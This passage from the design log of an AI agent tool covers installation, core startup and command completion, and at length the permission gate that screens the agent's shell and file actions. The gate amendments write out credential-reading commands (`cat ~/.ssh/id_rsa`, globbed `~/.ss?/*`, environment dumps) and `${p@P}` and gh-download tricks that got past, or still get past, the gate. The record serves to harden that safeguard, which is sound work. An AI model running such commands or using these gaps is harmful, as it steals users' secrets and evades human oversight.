- **Installer:** keeps the dedicated venv at `$EXO_HOME/venv` (the plugins and the optional Hermes need it), now
  installs `exo[tui]`, and links `~/.local/bin/exo` to it (`--bin-dir`). If that folder is not on PATH it prints
  the line for the user's shell and does not edit rc files unless `--modify-path` is given, and then only once. A
  foreign file at the link path is left alone. It writes `install` (mode, source, checkout, venv, python) to
  `config.json`. It never reads or writes keys. Re-running pulls a URL source and reinstalls, which is the upgrade.
- **`exo update`:** reads `install`; pulls the checkout and re-runs `install.sh` (which refreshes the venv and the
  plugins); or pull and `pip install -e` for a development checkout; or `uv tool upgrade exo`. Prints old -> new and
  runs a self-check: import, `exo.protocol.export --check`, `exo models`. `--dry-run` prints the steps. No protocol
  command (the protocol stays at 30).
- **Rejected:** `uv tool install` as the installer's only path (the plugin copy and the optional Hermes need the
  fixed venv; it stays an accepted layout for `exo update`); editing rc files by default (a silent change to
  the user's shell); a top-level `--seat` or `--resume` on the main parser (clashes with subcommand flags).
- **Not done:** Windows; a published package on PyPI (the git URL is the source until then); an
  `exo uninstall`.
  *Amendment 2026-10-18 (PR #213):* the installer also installs the skill pack into `$EXO_HOME/skills`, where the
  core's skill index and exo-orchestra read it. Each pack skill is its own folder with a `.exo-managed` marker, as
  plugins are, and the marker names the folder. A re-run, and so `exo update`, replaces or removes a folder only
  when its marker names it. `cp -r` copies the hidden marker, so a copy of a pack skill under a new name, or a
  renamed one, carries a marker for another name. That folder is the user's and is kept with a warning. A folder
  without a marker that differs from the pack's skill is left alone, and an exact copy is adopted. A link is never
  adopted, replaced or removed. Rejected: one marked `$EXO_HOME/skills` folder, because a refresh would delete the
  skills users add there. Rejected: removing every marked folder the pack lacks, because that deleted copies made to
  change a skill. Rejected: shipping the pack as package data, because exo-orchestra and the documented search
  order read `$EXO_HOME/skills`.
  *Amendment 2026-10-19 (#268):* plugins follow the same rule. A `--plugins` list removes a marked plugin folder it
  leaves out only when the marker names that folder, so a `cp -r` copy of a plugin is kept with a warning. A marker
  with no name line comes from an install before markers named their folder. Exo cannot tell that folder from a
  copy, so it is kept too, and a warning names it. A selected plugin with such a marker is refreshed and its marker
  gains the name. Rejected: treating a marker with no name as Exo's, because that deletes copies made before this
  change. Rejected: comparing the folder with the checkout's plugin, because an older install of a plugin that has
  changed since differs from it as much as an edited copy does.
  *Amendment 2026-10-21 (#260):* the subcommand parser imports a command's module only when that command runs.
  `src/exo/cli.py` lists each command that lives in another module in a `LAZY` table, with its module, handler and
  help line. `build_parser(cmd)` builds the full parser for `cmd` alone. Every other command keeps its name and
  help line, so usage, errors and `exo --help` are byte-identical to the full parser, and a test compares the two
  for every command. `exo --help`, `exo --version` and bare `exo` import no command module, and a module that fails
  to import breaks only its own commands. The update self-check now builds the full parser, so it still imports
  every command's module. Rejected: building the full parser for `exo --help`, because help would still pay for
  every import. Rejected: a checked-in snapshot of the help text, because every help change would have to edit it
  too. The cost is that each help line is written twice, in the module and in the table, and the test fails when
  they differ.

## D-036 (2026-10-12) `exo` and `exo web` in any order share one core
- **Why:** a live bug. `exo web` connected to `run/exod.sock`, found no `exo serve`, and the chat page showed
  `ConnectError: [Errno 2] No such file or directory`. The terminal client had already started the core in process
  and held the agent's writer lock (D-028), so the two clients only shared an agent if the user ran `exo serve` first.
- **Found:** the in-process core already serves `run/agent-<seat>.sock` (the same HTTP protocol) so other windows
  join it. The web client never looked there. A second core does not forward: it fails on the lock (`WriterBusy`).
- **Decision:** `exo.ensure_core.ensure_core`: use `exod.sock` if it answers, else `agent-<seat>.sock`, else start
  `exo serve` detached (new session, same env, log `logs/exod.log`, pid `run/exod.pid`) under a file lock
  (`run/exod-start.lock`), remove a stale socket file first, wait up to 40 s for it to answer, and fail with the log
  tail. If the writer lock is held by a process that serves no socket, say so and name the way out, never start a
  second core. `exo web` runs this in its feed loop, so it also re-resolves when the core goes away (a terminal window
  that held it closed): it re-joins or starts exod. The terminal client's `_open` now prefers a live exod, and a stale
  `exod.sock` no longer counts as a server.
- **Lifetime:** exod stays running until `exo stop` (or `exo serve --stop`). Simplest to explain and safe for the
  work a core does with no window open (background tasks, channels, schedules). Idle exit rejected: it can end a
  core between a client's check and its connect, and quietly kill long jobs.
- **Not changed:** the terminal client still runs the core in process when none exists (it does not spawn a daemon:
  tools and approvals stay tied to its window). Web with `--socket`/`--url` never starts anything. Page errors are
  sentences (`core_message`), not exception text. No protocol change.
- **Not done:** `--in-process` flag (the client already falls back in process); Windows.
- **Later (#145, #148):** the core is started through a `python -P` helper that calls `setsid`, forks and exits, so
  the core is reparented to init (or the nearest subreaper) and is not a child of the client, unless the client
  is itself PID 1 or a subreaper. This is hardening: `principal.stamp` refuses
  a peer that descends from the core, and the client that starts the core is its parent, so the old ancestry could
  not refuse that client. The handshake is bounded, reads the pid from the helper's last output line, and a core
  that dies while starting is reported at once (`waitpid` when this process adopted it, else a zombie or missing
  pid), with no made-up exit code. A client that adopted its cores reaps any that exited later at its next start.

## D-037 (2026-10-12) Completion and guidance in the composer
- **Why:** the principal asked for command autofill, suggestion and guidance, "a better version of what Hermes CLI
  has". The reference is the Hermes CLI (`hermes_cli/commands_completion.py`): a prompt_toolkit completer with a `/`
  menu, subcommand lists, ghost text from history and `@` file search. We studied it and built our own.
- **Decision:** one engine, `src/exo/complete.py`, pure Python with no UI: fuzzy ranking (exact, prefix, word start,
  contains, letters in order, then a word of the description), argument slots per command (`plan`), a `FileIndex` for
  `@`, `closest` for typos, `History`, `ghost`, and a `Guide` with the tip rules. The terminal client draws it
  (`Composer.key_hook`, `CompletionMenu`, ghost text drawn after the caret). The web client has the same logic in
  `static/complete.js` (checked against the Python in a test that runs node) and draws it in `composer.js`.
- **Sources of truth:** the command list is the client's own table plus the core's `commands.list`, asked once at
  start. Models come from `models.list` (the picker's source, so unsupported models are already left out), threads
  from `session.list`, grant ids from `command.run grants`, the default handoff path from `handoff_facts`, provider
  names from `providers_setup.rows`. Each is fetched on first use and cached 30 seconds.
- **Safety:** `@` lists names only, never reads a file, stays inside the working folder (no `/`, `~` or `..`), and
  drops anything `gate.is_sensitive_path` names. On the web it is a server route that needs the same loopback, Host
  and page-token guard as the key routes. History is per seat, mode 0600, 500 lines, and never keeps a line that
  looks like a key or password.
- **Guidance:** one dim line in the empty composer (the placeholder), from local rules over state the client already
  has: first run, a failed model call, a finished job, open findings, a slow turn, a long thread. At most one new tip
  per 25 seconds, each rule twice a session, none while a turn runs, a rule retires once you run its command, Tab
  fills it in. No model call. Off with `/tutorial off` (which also sets `guidance.enabled` false) or that config key.
  Under reduced motion there is no timer: it only updates on events.
- **Typo help:** an unknown `/comand` is not sent. The note says "did you mean /compact?" and the corrected line waits
  in the composer. With nothing close, the line goes to the core as before. The web does the same for its commands.
  *Amendment 2026-10-18 (issue #146):* on the web the names are the page's own commands, the core's `commands.list`
  and the terminal client's own (its `COMMANDS` table: core plugin names such as `/grants` count only when
  `commands.list` has them, as in the TUI), and "near" is the TUI's rule (a port of `complete.closest`, for
  lower-case names only). A `/name` from those the page does not run (`/grants`, `/help`), or a near typo of one,
  stays in the box with a note rather than becoming a message; a line close to no name (`/tmp is full`, `/data is
  corrupted`, `/Users is big`) is a message. Until the page has the core's names it holds every `/name` line that is
  not its own or the terminal client's, and asks again with no limit (1 s doubling to every 30 s, and on each send,
  which does not move the backoff on). The asking ends once the core has given its names (an older core that
  answers `unknown_command` or `unsupported` for `commands.list` counts, with no core names) and its
  `guidance.enabled` (an unset key, answered `not_found`, is on).
- **Rejected:** a model call to suggest commands (cost, latency, and the rules are enough); a second ranking in each
  client (they would drift); storing history in the browser (the web client keeps none across page loads, on purpose).
- **Not done:** file completion for bare paths (`./x`, `~/x`) outside `@`; `/findings <id>` (the core takes only
  `count`); the web client does not run the other slash commands, so its menu lists only what it runs.

## D-038 (2026-10-12) Gate default ask: a shell allowlist, the store is credentials, policy edits only tighten
- *Amendment 2026-10-28 (#473):* Git gc.recentObjectsHook is read as shell execution across git configuration forms, preserving policy denies on its nested command.
- *Amendment 2026-10-27 (issue #594, #609 and its review 5662072421):* a glob in a secret store's folder reads
  the store, and a `target:` entry matches every store a credentials line names. #609 (merged as 5a5a535d) tested a
  globbed folder against the folder of each glob sample (`_glob_folder_hit`), so `cat ~/.ss?/*`, `cat ~/.aw?/*`
  and `cat ~/.exo/key?/*` ask where they read with no ask. Its rules: (1) bash's `*`, `?` and `[..]` never match a
  leading dot, so a part matches a dot folder only when it starts with a literal dot (`~/.s*/*` and `~/.*/*` can
  reach `~/.ssh`; `~/[.]ssh/*` and `~/*/*` cannot, and stay reads); (2) a match needs a part that starts with a
  literal dot or three literal characters across the matched parts, so `src/*/*` stays ordinary; (3) when the
  folder matched is a secret store by name (`_SENSITIVE_PATH`: `.ssh`, `.aws`, `.gnupg`, `.exo/keys`), any glob
  file part below it asks, as below the literal folder; (4) a file part that ends in `.pub` stays out, as for a
  literal folder (`cat ~/.ss?/*.pub` is a read, `cat ~/.ss?/*.pu?` asks). The follow-up adds: (5) a glob folder
  that goes deeper than a secret folder asks too, its leading parts matched with the same discipline, since a
  folder below a store is a store (`cat ~/.gnup?/private-keys-v1.d/*`, `cat ~/.aw?/sso/cache/*`,
  `cat ~/.ss?/keys/*`, `cat ~/.exo/key?/old/*`, `cat ~/.gnup?/*/*` and `read_file ~/.gnup?/private-keys-v1.d/*`
  were read/allow, also under `deny: [credentials]`); a folder that is not a secret by name still matches at its
  own depth only (`cat ~/.config/*/x/*` stays a read), and a secret folder that matches wins over an ordinary one.
  (6) The regression review 5662072421 found: a credentials line takes the first store-naming word as its target,
  and since #609 a secret-folder glob counts as one, so it came first and a `target:` deny, `reserved:` entry or
  rule on a later literal store stopped matching. `cat ~/.ss?/* ~/.aws/credentials` under
  `deny: ["target:*/.aws/*"]`, `cat ~/.aw?/* ~/.ssh/id_rsa` under `deny: ["target:*/.ssh/*"]` and a rule on
  target `*/.aws/*` with decision `deny` went deny -> ask, and `reserved: ["target:*/.ssh/*"]` lost its entry (717
  lowered pairs on 270 actions in the review's run). Now every other store the line names (each word or brace word
  `_shell_credential_hit` finds, not only the first) is a `credentials` part with that store as its target
  (`other_store`), beside the line's own target, which stays the first. The deny, reserved and rule entries read
  every part (D-075, #191), so they match any store on the line. This also lifts #313 group 4 below for literal
  stores: `cat ~/.aws/* ~/.ssh/id_rsa` and `cat ~/.aws/credentials; cat ~/.ssh/id_rsa`, which asked under
  `deny: ["target:*/.ssh/*"]` on main and before #609, are denied. Where a Keychain read, an environment dump or a
  secret variable is the line's first hit, the stores after it are listed as well, so
  `security find-generic-password -w -s x; cat ~/.ssh/id_rsa`, `env; cat ~/.ssh/id_rsa` and
  `cat /proc/self/task/1/environ; cat ~/.ssh/id_rsa` are denied there too. The ssh hop's host copy (#320) and a shell
  call's folder read (#311) pass these parts over, so each reads the line as main does. Each part only adds a match.
  Where a glob below a secret folder comes first it is the line's target now
  (`cat ~/.gnup?/private-keys-v1.d/* ~/.ssh/id_rsa`), with the store after it a part, so the decisions stay.
  gate_diff (main's script) ran main e0968a2b against this change: the built-in corpus (12,065 actions x 88
  policies, 1,061,720 pairs) 0 lowered, 698 stricter pairs on 27 actions; 1,583 aimed lines and calls under the
  built-in policies and 57 target, reserved, rule, scope, category and matrix policies (229,535 pairs) 0 lowered,
  21,770 stricter pairs on 915 actions. The hook, in enforce, observe and bypass under six policies, decides none
  of 360 probe calls lower. The folders a glob is tested against are built once per set of samples
  (`_glob_folders`), not once per glob word, so a line of 500 ordinary globbed-folder words (`src/*/x1*`)
  classifies in 0.11s where main takes 0.52s. A line that names a store now reads every later word for a store
  too, where main stopped at the first: 500 globbed store words take 0.15s (main 0.02s), still linear.
  Rejected: deciding the line again on each other store as an `alt_target` (#399), which would also bind every
  approval of the line to its exact text and word the card "it may land on". Limits: the samples bound what a glob
  folder reaches, so a store with no sample (`cat ~/.cla*/.cred*`, `cat ~/.config/gclou?/*.json`), one outside the
  home folder (`cat /home/u/.ss?/*`), a relative glob folder after `cd` (`cd ~/x && cat ../.ss?/*`), a literal file
  part below a glob folder (`cat ~/.ss?/config`) and a glob that names the store folder itself
  (`tar cf /tmp/x.tar ~/.ss?`) still read, as on main; `$EXO_HOME/principals/*/run/*` still reads. Tests:
  `tests/security/test_gate_glob_store_folder_594.py`, `tests/security/test_gate_glob_target_second_store_609.py`.
- *Amendment 2026-10-26 (issue #579):* a prompt-string transformation is code the gate cannot see, unless the
  line assigns the variable a literal value. `${name@P}` expands the value as a prompt string, and with
  `promptvars` on, the default, that runs its command substitutions and expands its parameters, so the gate
  read such a word as the parameter's ordinary expansion and allowed it: `printf -v p '%s(%s)' '$' 'id';
  echo ${p@P}` runs `id`, `p='$(id)'; echo ${p@P}` ran it where the gate's ask came only from the assignment
  it read, and a value a command the gate does not read as an assignment sets (`printf -v`, `read`) rebuilds
  a form the gate reads only as written — a `/` substitution of a store variable (#342) — so
  `read -r p <<< '${HOME/%//.kube}/config'; cat ${p@P}` read `$HOME/.kube/config` as an allowed read. Now any
  `${..@P}` the line expands (a parameter, an array element, the positional parameters and their ranges,
  also in double quotes, a here-string, a here-document body or a redirection target, and nested in a word
  bash expands) is an `opaque_exec` part that asks, beside the line's other parts (D-075), so a deny on them
  still wins. One exception keeps the everyday lines: a variable the line assigns a literal value with no
  `$`, backtick or backslash prompt-expands to itself, so `p=x; echo ${p@P}` stays a read; the last assignment
  wins, so a literal keeps the line a read while a value the gate cannot read makes the parameter unknown
  again (`p=x; p=$y`, an append onto it too, `p=x; p+=$y`), an exporter's assignment counts, a literal
  appended to a literal is still one, and after an `unset` the value is empty. An exporter's arguments
  expand before any of its assignments applies, so a `${..@P}` in one reads the value from before it
  (`export p=x q=${p@P}` asks). A prefix assignment sets the command's own environment, which bash expands
  the words before, so it is no source, and a value `printf -v` or `read` fills is never one the line
  spells, so either clears the literal the line set for the name. The
  other `@` operators decode or spell the value and run nothing, so they keep their reading, and the
  operator is read only where the parameter ends, so `echo ${x:-foo@P}` stays a default word. Chosen over
  reading the value's own substitutions (the gate cannot know where the value's text ends or what a prompt
  escape spells — `p='\u'` is the username) and over asking on every transformation (the inert ones run
  nothing). No decision is lower: each new part only adds an ask. Tests:
  `tests/security/test_gate_prompt_expansion.py`.
- *Amendment 2026-10-26 (issue #466):* a pattern a decision runs that does not compile is refused when the policy
  loads, not when `decide` first reaches it. `normalize_policies` checked types and outcome names but compiled
  nothing, so a rule's `match.command`, a `command:<regex>` entry or a mapping's `command` in `deny:` and
  `reserved:`, and a `posting.forbid` pattern with a typo raised `re.PatternError` at decide — on the call the
  pattern reached, only. The exo-gate hook caught it: with no required executor a read tool ran with no ask,
  observe mode ran the call, and enforce mode showed a fallback card with no approver list whose "always" let a
  seat answer every later call the gate failed on (`plugin_rule:exo-gate:error:<tool>`). Now
  `normalize_policies` compiles each of those patterns (a forbid entry with its `ignore_case` flag) and raises
  `PolicyError` naming the entry — `gates.deny[0].command: bad pattern '^(rm|shred': missing ), unterminated
  subpattern at position 1` — and `load_policies` names the file before that, so the hook's policy-error fallback
  (the defaults, which ask on anything irreversible or public) decides instead, with the message in every
  decision's reason and in `/gate`. A store write, a secret and a force push still ask the principal alone, once,
  in every mode, on a real rule key where the error card had none an approver list could be read from. Chosen
  over dropping only the bad entry and keeping the rest: the defaults are the posture every other malformed
  policy file already gets, and one refusal that names the file and the entry is easier to fix than a policy
  silently missing the entry a principal added to tighten the gate, with a ledger row to notice it by. A policy
  whose patterns compile decides identically; only the broken one changes, from a per-call failure to a
  load-time refusal. The scrub's patterns were checked at load already (D-033). The differential against main
  6054da56 (11405 actions, 88 policies) found nothing lowered. Tests:
  `tests/security/test_gate_policy_patterns.py`, `plugins/exo-gate/tests/test_hook.py`
  (`test_a_policy_pattern_that_does_not_compile_refuses_the_policy_*`),
  `plugins/exo-gate/tests/test_tool_cwd.py`.
- *Amendment 2026-10-26 (issue #493):* an ssh or mosh hop keeps its host among the line's other targets when the
  remote command names a target of its own. The hop gave the host as the line's target only when the remote
  command's dominant part had none (`c.target = c.target or dest`), so `ssh prod 'echo hi > /etc/hosts'` was a
  `local_write` of `/etc/hosts` alone: a `target: prod` rule did not reach it and allowed it, `scopes:
  {private: [/etc/*]}` read a path on another host as the principal's own, and a standing grant for a local write
  to `/etc/hosts` covered the same write on any host. A deny or `reserved:` entry on the host still reached the
  hop's part (D-075). Now the host and the destination stay among the other targets (#399) whenever the line's
  target is not one of them, so `decide` runs the line on the host too and the strictest stands. The written path
  stays the line's target, so a rule on it still matches as before, and the host reading only raises: the rule
  reaches the line as a deny reaches the hop's part, a scope on a local path stops at the host's reading, which
  keeps the exposure the hop gives the line, and a line with other targets binds its approval to the exact
  command, so no grant for a local write runs the hop. A rule on the bare host reaches a `user@host` destination
  too. Against main df4195ab the differential with a policy keyed on the host lowers no pair. Tests:
  `tests/security/test_gate_sudo_redirect.py`, `tests/security/test_gate_gh_target_operands.py`.
- *Amendment 2026-10-26 (issue #514):* a store write names every store path it writes a target, not only the
  first one the scan meets. The scan returned at the first store path and made one `store_write` part of it, so a
  `target:` deny or `reserved:` entry on a later path missed: `cp ~/.exo/policies/a.yaml
  ~/.exo/policies/gates.yaml`, `copy_file` and `move_file` from `a.yaml` to `gates.yaml` and `delete_file` on
  both paths asked under `deny: ["target:*/gates.yaml"]`, where an approver could have waved the write through.
  The scan now keeps each store path a shell line or file tool writes, in the order it meets them, and each is a
  `store_write` part with that path as its target, as beside a secret (#447). The first path still leads the line,
  `rm` of both paths was denied already (its `delete` part names the last path), reads keep their class, and the
  first path alone decides as before. gate_diff against the merge parent 1c3d4322 found 0 lowered on the
  built-in corpus, but the scan of every word lowered a later command's braced store write (the #611 follow-up
  amendment below), and `apply_patch` and `write_file` kept a later store path a `local_write` part.
- *Amendment 2026-10-27 (#611 follow-up, review 5662072103):* a later command that repeats a braced store path keeps
  its own `store_write` part. The store check expands and checks each brace spelling once per line, and marked a
  spelling checked for the whole line; once #514 scanned every word, the first command marked each spelling it
  met, and a later command that wrote the same spelling got no part, so its write had the first command's own
  text (#394). Under `{categories: {store_write: deny}, rules: [{match: {command: '^cp '}, decision: allow}]}`,
  `cp ~/.exo/policies/a.yaml ~/.exo/policies/{g,h}.yaml; printf x > ~/.exo/policies/{g,h}.yaml` was denied on
  1c3d4322 and asked on main e0968a2b, and so did a matrix deny, a `log` or `ask` rule, and `tee`, `sudo tee`,
  `truncate` or `scp` in place of `printf`; with `cp /var/tmp/a` first, the line asked on 1c3d4322 too. Each
  check's hits on a spelling are now kept with it (`_shell_hits`), and a command that repeats the spelling gets
  them for its own part; only a check that found nothing still covers a narrower one. The braced line decides as
  the unbraced one does. The hits a repeat gives again come from a third 4,096 budget per call (`_BRACE_BUDGET`),
  so a line of many repeats makes a bounded number of parts (40 `cp` commands that repeat a 676-path spelling make
  4,772 store parts, each command with its own, where 27,080 without the budget; main made 677, all the first
  command's); past it a repeat is one hit on the word as written, as a word past the brace cap is. The extra parts
  cost time: that line classifies and decides in about 0.3 s, where main took 0.1 s. A redirect target or folder
  check (`>`, `cd`, `git -C`) keeps only its first hit, as main's `any()` stopped at it. `apply_patch`
  and `write_file` that write more than one store file make each store path past the first a `store_write` part
  too, as `copy_file` does, so a `{category: store_write, target}` deny or reserved entry on a later file matches.
  A case variant the store reads since #635 (`~/.EXO/policies/{g,h}.yaml`) keeps its part the same way.
  Parts are only added; gate_diff against main e0968a2b lowered 0 of 1,053,712 pairs on the built-in corpus
  (`--no-variants`, 0 tightened) and, on an aimed corpus (614 actions: the review's lines and their unbraced and
  case-variant controls under each writer, `cd`, `pushd`, `-C` and file tool forms, the #651 replace tools, and
  lines of many repeats, redirect and folder ones too; 135 policies, the built-in ones and 47 on targets, rules on
  `^cp `, matrix cells and reserved entries), 0 of 82,890 pairs, with 485 tightened. Not covered, as before: a relative path read from a `cd` into the store, from
  `tar -C` or `git -C`, or from the call's own folder (#453, #527) is no target, so a `target:` entry on it does
  not match (`cd ~/.exo/policies && cp a.yaml gates.yaml` asks under `deny: ["target:*/gates.yaml"]`). The `cd`
  and `-C` lines still ask the principal alone; the own-folder line is allowed, as #453 records.
- *Amendment 2026-10-26 (issue #516):* an allow rule keyed on `command` that would lower the line over the matrix
  deny of the part a shell call's own folder read adds (#311) must name the folder, as it names the `cd` in the cd
  form; naming the folder never lifts that deny. The part had no own text, so a line of
  one command beside it was one text for the #394 own-text test (`_one_text`) and the rule decided the line as
  before, over the part's cell: `git push --force origin main` with `~/.ssh` or `~/.exo/keys` as `cwd` or `workdir`
  asked under `matrix: {irreversible: {private: deny}}` and an allow rule on `git push`, where its `cd` form was
  denied, since the rule does not name the `cd`. Now the part carries a `_StandIn` for `cd <folder>` among its
  setters, the folder as the call spells it (`~/.ssh`, or a relative `keys` when the call gives one), so the line
  is not one text and the #394 pass runs: a rule that names the line's text but not the folder is passed over, for
  the part as for any part it does not name, and the part's cell stands, as the cd form's parts' cells do. The
  part itself keeps no own text, so no rule lifts its deny — not one that names everything either, as before, and
  not one that lifts the weight a heavier command adds beside the part (#468), which has no own text. A line of
  two or more commands, a policy with no rule and no matrix deny decide as before. Chosen over keying the part on
  the line's own command scope: the stand-in keeps the part weighed as the `cd` form's is and rules matched against
  what a `cd` on the line would read as, so the two spellings agree. *Differential against main 6054da56*
  (`scripts/gate_diff.py --no-variants --jobs 4`): 11,406 actions x 88 policies, 1,003,728 pairs, none lowered
  (outcome, reserved or posting violation), 728 pairs tightened on 361 actions — a folder part's matrix or category
  deny standing where an allow rule on the line lifted it, this amendment's rows among them. Tests:
  `tests/security/test_gate_tool_cwd.py`, `plugins/exo-gate/tests/test_tool_cwd.py`.
- *Amendment 2026-10-26 (issue #461):* a gh download or clone writes the store the way `curl -o` and
  `git clone` do. gh's download and clone subcommands read on GitHub, so the store check took a line whose
  every part reads as a read for a read and never looked at their output paths: `gh release download -O
  ~/.exo/policies/gates.yaml --clobber` overwrote the gate policy, `-O ~/.exo/update/allowed_signers`
  replaced the signed-update trust pin (#133), `gh run download` with `-D`/`--dir` filled `state/`, `gh
  attestation download` (which has no such option) filled the current folder after a `cd` into the store,
  and `gh repo clone` or `gh gist clone` with a store directory filled it too, where `curl -o` and `git
  clone` on the same paths ask. Now the store check reads their output paths as writes — `-O`/`--output`
  and `-D`/`--dir` in every spelling, the clone's directory word, also with `--` before it, and the current
  folder after a `cd` — wherever the line stands: under `sudo`, in a `$( )`, and past a `-R` before the
  subcommand (#399). In `bash -c` the line already asked before, as opaque code with a store write. The
  line grows a `store_write` part and keeps the gh read as its other part (D-075), so a deny, `reserved:`
  entry, rule or matrix cell on the gh reading still holds, and the decision is the principal-only floor.
  `-O -` prints to stdout and stays a read, and so does a path outside the store and every other gh read.
  Amended the same day (review 5658467251, the #461 follow-up): over an ssh or mosh hop the store write now
  leads the remote line and the gh read is a part below it, and the hop gave the host (#399) only to the
  line's own parts, so the read lost the host its empty other target took when it led. A deny or rule on
  `{category: read, target: host}` asked where it denied before (`ssh host gh release download v1 -R pub/x
  -O ~/.exo/policies/gates.yaml`, `gh repo clone` and `gh run download` into the store, the `sudo` and
  `mosh` forms), and a deny on `{category: opaque_exec, target: host}` asked on the `eval` and stdin forms;
  the review's gate_diff counted 421 pairs on 150 actions, and on main at e0968a2b the follow-up's aimed
  corpus (242 actions, 169 policies) counts 499 pairs on 81 actions lowered against main before #461
  (dcab371a), all on ssh, mosh or `scp -o RemoteCommand` hops. Each part nested below a hop with an empty target
  now has a copy on the host among the line's parts (as #320's: no parts, no post), and the host joins a
  nested part's empty other target. Every part keeps its own target, so each entry that matched before still
  matches and the host's entries match too. A part that led over the gh read and took the host has a copy
  on the host the same way: each of mosh's local helpers (`--ssh`, `--client`, `--server` with `--local`)
  that does not lead, and the part that runs ssh's stdin where the remote line leads (`echo x | ssh $H gh
  release download ..`, the whole part and its own copies). `ssh -o RemoteCommand=` raised only the remote
  line's lead to internal, so the gh read below the store write stayed private: every part of that line is
  raised now, as for the hop's own command (D-075), on a copy, and each nested part keeps its private
  reading as a copy beside it (no parts, no post): the raise alone took the gh read away from an entry
  keyed on `exposure: private`, and `{match: {category: read, exposure: private}, decision: deny}` asked
  at the store floor where main denied. The same holds where main's later readings make the store write
  below the hop: a store path in another letter case (#635), a `$((` read as a command substitution (#652)
  and an `env -S` text (#634), so `ssh host gh release download v1 -R pub/x -O ~/.EXO/policies/gates.yaml`
  and `ssh host 'echo $((gh release download ..) )'` deny under `{category: read, target: host}` as the
  plain spelling does. So the deny, rule, reserved entry or matrix cell on the gh reading, including a host
  target on a hop, holds as before #461 or stricter (gate_diff on the aimed corpus, which holds the
  review's lines, the follow-up's hop forms, the `exposure: private` forms and those later readings: 0
  pairs lowered against main at e0968a2b and 0 against dcab371a; built-in corpus: 0 against e0968a2b).
  The remote line is always copied before (also with `mosh --local`), so a stored result is never changed.
- *Amendment 2026-10-24 (issue #542):* an explicit `gates.escalate` must be a mapping, and its `categories`, when
  present, must be a list. A malformed value raises `PolicyError` during normalization and store policy loading,
  rather than silently retaining defaults or using substring membership on a string. Omitted settings, an empty
  mapping and valid mappings keep their existing behavior. An empty category list disables only category
  escalation. Chosen over interpreting a bare list as shorthand: rejecting it makes the existing schema explicit
  and catches scalar and null mistakes through the same path. No classification or valid-policy decision changes.
- *Amendment 2026-10-25 (issue #557):* with #542 alone, the exo-gate plugin met a malformed `escalate` with its
  policy-error fallback, the defaults, and so dropped every other section of the principal's policy (deny,
  reserved, categories, rules, matrix, budget, posting, the internal-names scrub) for the session. A deny then
  asked, a category deny allowed and a reserved push logged where main before #542 kept them. Now a malformed
  `escalate` or `escalate.categories` keeps the principal's other sections: `load_policies(root, errors)` records
  the message and repairs only that section (the default escalation plus the category names the value gives), and
  the plugin decides each call under the repaired policy and the defaults and keeps the stricter, merged as a
  line's readings merge (#399: the widest exposure, every violation and reserved part). The reason says
  `policy error, stricter of your policy and the defaults applies`. Approvers and the "always" length are no wider
  than the defaults'. A changed file with this error is decided the same way, and when the pinned or the changed
  file has it, the old and new decisions merge the same way too, so the other's violations are kept at an equal
  outcome. While the pinned or the changed file has this error, a standing grant applies only where the decision
  as after #542 (the defaults in place of the file with the error, then the decision model's verdict) also asks
  and finds a grant; otherwise the merged decision stands and the call asks. Every other policy error still
  falls back to the defaults alone, and a caller without the list still gets `PolicyError`: the loader still
  rejects a bare list as #542 ruled, and only the plugin's repair honours the names a list or string gives (tighten
  only), so `escalate: [read]` and `escalate: read` make reads ask. `/gate` shows a standing policy error for the
  pinned and the changed file. Under a malformed `escalate` no decision is lower than main after #542, the
  decision model and standing grants included, and a valid policy decides as before, grants included. Limits:
  lower than main before #542 (1d2f32ac) where a shape crashed the classifier there (`escalate: {categories: 7}`
  asked on every call by accident), and where a grant bound to the exact line applies because the defaults ask
  with that binding, equal to main after #542 (`gh pr close` on a repo the policy's `scopes` make internal, which
  1d2f32ac logged, or private beside a matrix ask, which it asked for without a binding). Ruled in review 5644671413:
  repair plus the stricter of the policy and the defaults, chosen over the defaults alone (lower than before #542 for
  every tightening) and over the other sections alone (lower than after #542 for a section looser than the defaults);
  a malformed list's names count, tighten only; merging the old and new decisions of two valid files is a separate
  issue.
- *Amendment 2026-10-26 (issue #586):* the D-038 old/new merge covers two valid files now, not only a session with
  a policy error (#557). The changed file used to win only with a strictly higher outcome; at an equal outcome the
  pinned decision stood with its own violations and exposure, and a standing grant was looked up against that one
  decision. Two grant behaviours then ran a call lower than either file alone: an unbound grant on the changed
  file's `reserved` hit ran a call the pinned file logs (`git push origin main` logs under
  `escalate: {categories: [payment]}`; the changed file adds `reserved: [vcs_push]`, and a standing `vcs_push`
  grant on `origin` runs it), and a grant bound to the exact line ran a call the pinned policy asks for without
  that binding (a pinned `categories: {local_write: ask}` asks for `sudo echo hi > /tmp/f` unbound; the changed
  file names `read` in a valid escalate, the displaced part asks, the line binds, and the grant runs it). Now the
  old and new decisions merge as one stricter reading (`gate.stricter`, as #557 merges them beside a policy
  error): the widest exposure, a third party if either has one, every violation, every reserved part, and the same
  tie order — the other side stands at an equal outcome only when it lists a violation the standing one lacks.
  A standing grant applies only where each side's own decision (with the decision model's verdict) also asks and
  finds one, each side by its own lookup, as #557 found: an unbound and a bound grant for one line are found by
  different lookups, so requiring one grant of both would run the call lower than main where one side binds and
  the other does not. So the merged ask runs only where both sides would run it, and a change that only binds the
  line (a wider exposure, a displaced part that asks) cannot let a grant cover a call the pinned policy asks for.
  Decisions that change for valid policies: at an equal outcome the changed side's violations stand on the card
  and the exposure is the widest of the two, so an ask can bind to the exact line where the pinned decision alone
  did not, and list a posting or scrub finding it did not; no outcome is lower than either side's, and a single
  valid file decides as before, grants included. Ruled in review 5644671413 on #569 (point 3): two valid files
  stayed out of that PR because they change decisions for valid policies and needed their own differential and
  probe. The differential against main 3bf26afc (11,440 pairs, no variants) found nothing lowered — it cannot see
  this branch; the hook probe (the real Gate of both trees, 800 cells: 10 valid file pairs x 10 lines x no,
  unbound, bound and both grants, with and without a decision-model ask) found 0 lower than main, and 6 pairs that
  take the wider exposure at an equal outcome (`gh pr close 5 -R acme-org/app` beside a scope that no longer holds
  asks with the wider exposure). Tests: `plugins/exo-gate/tests/test_hook.py`
  (`test_valid_files_grant_*`, `test_a_single_valid_file_still_decides_alone`,
  `test_two_valid_files_keep_the_changed_violation_at_an_equal_outcome`,
  `test_two_valid_files_take_the_widest_exposure_and_keep_a_reserved_part`).
- *Amendment 2026-10-26 (issue #494):* a file tool's store path is read under every key it names a path by, and a
  move of a folder that holds the store is a store write with no secret beside it, as `mv` is. The generic
  file-tool branch read a store path only under `path` and the other `_PATH_ARG_KEYS` names, and passed
  `ancestors=` only for a delete, so `move_file ~/.exo -> /tmp/x` was a `local_write` that ran with no ask where
